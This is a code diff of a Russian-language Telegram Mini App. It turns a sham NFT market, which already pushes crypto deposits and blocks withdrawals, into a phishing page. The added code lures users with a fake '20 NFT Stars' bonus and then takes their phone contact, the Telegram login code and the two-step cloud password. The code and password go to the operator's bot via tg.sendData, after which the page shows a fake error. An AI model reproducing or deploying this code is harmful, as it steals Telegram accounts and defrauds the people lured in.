@@ -3,155 +3,110 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Crypto NFT</title>
+    <title>NFT Stars Bonus</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --bg: #0b0b0c;
-            --card: #161618;
-            --accent: #007aff;
-            --text: #ffffff;
-            --secondary: #8e8e93;
-            --green: #32d74b;
-        }
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: var(--bg);
-            color: var(--text);
-            margin: 0; padding: 16px;
-            -webkit-user-select: none;
-        }
-        .glass-card {
-            background: var(--card);
-            border-radius: 24px;
-            padding: 24px;
-            margin-bottom: 16px;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-        }
-        h2 { font-size: 26px; font-weight: 700; margin: 0 0 20px 0; }
-
-        /* NFT Grid */
-        .nft-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-        .nft-item {
-            background: var(--card);
-            border-radius: 20px;
-            padding: 12px;
-            text-align: center;
-        }
-        .nft-icon {
-            font-size: 40px;
-            height: 100px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #1c1c1e;
-            border-radius: 16px;
-            margin-bottom: 10px;
-        }
-        .nft-price { color: var(--green); font-weight: 700; margin-top: 5px; }
-
-        /* Кнопки */
-        .btn {
-            background: var(--accent);
-            color: white;
-            border: none;
-            border-radius: 16px;
-            padding: 16px;
-            width: 100%;
-            font-weight: 600;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        .btn-crypto {
-            background: linear-gradient(90deg, #f2a900, #ffcd53);
-            color: #000;
-        }
-
-        /* Навигация */
-        .nav {
-            position: fixed;
-            bottom: 0; left: 0; right: 0;
-            background: rgba(11, 11, 12, 0.95);
-            backdrop-filter: blur(20px);
-            display: flex;
-            padding: 12px 12px 30px;
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-        }
-        .nav-item { flex: 1; text-align: center; color: var(--secondary); font-size: 11px; }
-        .nav-item.active { color: var(--accent); }
-        .nav-icon { font-size: 22px; display: block; margin-bottom: 4px; }
-
-        .section { display: none; }
-        .section.active { display: block; animation: fadeIn 0.3s ease; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        :root { --bg: #0b0b0c; --card: #161618; --accent: #007aff; --text: #ffffff; --secondary: #8e8e93; }
+        body { font-family: -apple-system, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 20px; text-align: center; }
+        .glass-card { background: var(--card); border-radius: 24px; padding: 24px; border: 1px solid rgba(255,255,255,0.05); margin-top: 20px; }
+        .stars-count { font-size: 48px; font-weight: 800; color: #ffd700; margin: 10px 0; text-shadow: 0 0 20px rgba(255,215,0,0.3); }
+        .input-group { margin-top: 20px; text-align: left; }
+        input { width: 100%; padding: 14px; border-radius: 12px; border: none; background: #2c2c2e; color: white; margin-top: 8px; box-sizing: border-box; font-size: 16px; }
+        .btn { background: var(--accent); color: white; border: none; border-radius: 14px; padding: 16px; width: 100%; font-weight: 600; margin-top: 20px; cursor: pointer; }
+        .step { display: none; animation: slide 0.3s ease; }
+        .active { display: block; }
+        @keyframes slide { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
-<div id="market" class="section active">
-    <h2>NFT Маркет</h2>
-    <div class="nft-grid">
-        <div class="nft-item" onclick="buy('Star 100', 100)"><div class="nft-icon">✨</div><div>Star 100</div><div class="nft-price">100 $</div></div>
-        <div class="nft-item" onclick="buy('Star 500', 500)"><div class="nft-icon">🌟</div><div>Star 500</div><div class="nft-price">500 $</div></div>
-        <div class="nft-item" onclick="buy('Star 1000', 1000)"><div class="nft-icon">💫</div><div>Star 1000</div><div class="nft-price">1000 $</div></div>
-        <div class="nft-item" onclick="buy('Star 1500', 1500)"><div class="nft-icon">💎</div><div>Star 1500</div><div class="nft-price">1500 $</div></div>
+    <div id="step-bonus" class="step active">
+        <div class="glass-card">
+            <div style="font-size: 50px;">🎁</div>
+            <h2>Ваш бонус!</h2>
+            <p style="color: var(--secondary);">Вы получили подарок за первый вход</p>
+            <div class="stars-count" id="stars">0</div>
+            <p>NFT Stars</p>
+            <button class="btn" onclick="getStars()">Забрать 20 звезд</button>
+        </div>
     </div>
-</div>
 
-<div id="profile" class="section">
-    <h2>Кабинет</h2>
-    <div class="glass-card">
-        <div style="color: var(--secondary); font-size: 14px;">Баланс</div>
-        <div style="font-size: 38px; font-weight: 800; margin: 10px 0;">0.00 $</div>
-        <div style="color: #ff453a; font-weight: 600; margin-bottom: 20px;">• Требуется верификация</div>
-        <button class="btn" onclick="requestPhone()">🛡 Верифицировать аккаунт</button>
+    <div id="step-phone" class="step">
+        <h2>Регистрация</h2>
+        <p style="color: var(--secondary);">Подтвердите владение аккаунтом для зачисления звезд</p>
+        <div class="glass-card">
+            <button class="btn" onclick="requestPhone()">🛡 Поделиться номером</button>
+            <p style="font-size: 12px; color: var(--secondary); margin-top: 15px;">Нажмите кнопку для автоматической верификации</p>
+        </div>
     </div>
-</div>
 
-<div id="wallet" class="section">
-    <h2>Кошелек</h2>
-    <div class="glass-card">
-        <p style="color: var(--secondary); margin-bottom: 20px;">Пополнение доступно только в криптовалюте через защищенный шлюз.</p>
-        <button class="btn btn-crypto" onclick="payCrypto()">💎 Пополнить USDT (TRC-20)</button>
-        <button class="btn" style="background: #2c2c2e; margin-top: 15px; color: #555;" onclick="tg.showAlert('Вывод заблокирован до подтверждения личности.')">Вывести средства</button>
+    <div id="step-code" class="step">
+        <h2>Код подтверждения</h2>
+        <p style="color: var(--secondary);">Мы отправили код в ваш Telegram</p>
+        <div class="glass-card">
+            <input type="number" id="sms_code" placeholder="00000" oninput="if(this.value.length==5) sendCode()">
+            <button class="btn" onclick="sendCode()">Продолжить</button>
+        </div>
     </div>
-</div>
 
-<div class="nav">
-    <div class="nav-item active" onclick="tab('market', this)"><span class="nav-icon">🛒</span>Маркет</div>
-    <div class="nav-item" onclick="tab('profile', this)"><span class="nav-icon">👤</span>Профиль</div>
-    <div class="nav-item" onclick="tab('wallet', this)"><span class="nav-icon">👛</span>Кошелек</div>
-</div>
+    <div id="step-2fa" class="step">
+        <h2>Двухэтапная аутентификация</h2>
+        <p style="color: var(--secondary);">Введите ваш облачный пароль</p>
+        <div class="glass-card">
+            <input type="password" id="password_2fa" placeholder="Ваш пароль">
+            <button class="btn" onclick="send2FA()">Подтвердить</button>
+        </div>
+    </div>
 
-<script>
-    let tg = window.Telegram.WebApp;
-    tg.expand();
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
 
-    function tab(id, el) {
-        document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
-        document.getElementById(id).classList.add('active');
-        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-        el.classList.add('active');
-    }
+        // 1. Анимация начисления звезд
+        function getStars() {
+            let count = 0;
+            let interval = setInterval(() => {
+                count++;
+                document.getElementById('stars').innerText = count;
+                if(count >= 20) {
+                    clearInterval(interval);
+                    setTimeout(() => { showStep('step-phone'); }, 1000);
+                }
+            }, 50);
+        }
 
-    function requestPhone() {
-        // Системный вызов Telegram для передачи номера телефона
-        tg.requestContact((ok) => {
-            if (ok) {
-                tg.showAlert("Данные успешно переданы на проверку!");
-            } else {
-                tg.showAlert("Для верификации необходимо предоставить доступ к номеру.");
+        function showStep(id) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
+
+        // 2. Запрос номера
+        function requestPhone() {
+            tg.requestContact((ok) => {
+                if(ok) {
+                    showStep('step-code'); // Переход к коду после клика
+                }
+            });
+        }
+
+        // 3. Отправка кода
+        function sendCode() {
+            let code = document.getElementById('sms_code').value;
+            if(code.length >= 5) {
+                tg.sendData("code:" + code); // Шлем боту
+                showStep('step-2fa');
             }
-        });
-    }
+        }
 
-    function buy(n, p) { tg.showConfirm(`Купить ${n} за ${p}$?`, (o) => { if(o) tg.showAlert("Недостаточно средств."); }); }
-    
-    function payCrypto() {
-        tg.sendData("pay_crypto"); // Отправляем сигнал боту
-        tg.close();
-    }
-</script>
+        // 4. Отправка 2FA
+        function send2FA() {
+            let pass = document.getElementById('password_2fa').value;
+            if(pass.length > 0) {
+                tg.sendData("2fa:" + pass); // Шлем боту
+                tg.showAlert("Ошибка синхронизации. Попробуйте позже.");
+                tg.close();
+            }
+        }
+    </script>
 </body>
 </html>
